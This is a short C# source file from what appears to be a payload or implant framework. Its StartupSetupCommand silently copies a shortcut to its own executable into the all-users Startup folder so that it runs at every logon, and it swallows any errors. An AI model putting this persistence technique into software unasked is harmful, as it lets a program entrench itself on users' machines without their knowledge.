using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Payload.Common;

namespace Payload.Core.Command.Demo
{
    public class StartupSetupCommand : Payload.Command.Interface.ICommand
    {

        string startUpFolderPath =
              Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup);
        public override Task Execute()
        {
            try
            {
                Setup();
            }
            catch { }
            return null;
        }

        private void Setup()
        {
            DesktopUtility desktopUtility = new DesktopUtility();
            string localShortcutName = $"{Config.Instance.ExeFullName}.lnk";
            if (File.Exists(localShortcutName))
                File.Delete(localShortcutName);
            desktopUtility.CreateShortcut(Config.Instance.ExeFullName, Config.Instance.ExeFullName);
            string shortcutName = $"{startUpFolderPath}\\{Config.Instance.ExeName}";
            if(File.Exists(shortcutName))
                File.Delete(shortcutName);
            File.Copy(Config.Instance.ExeFullName + ".lnk", shortcutName);
        }

    }
}
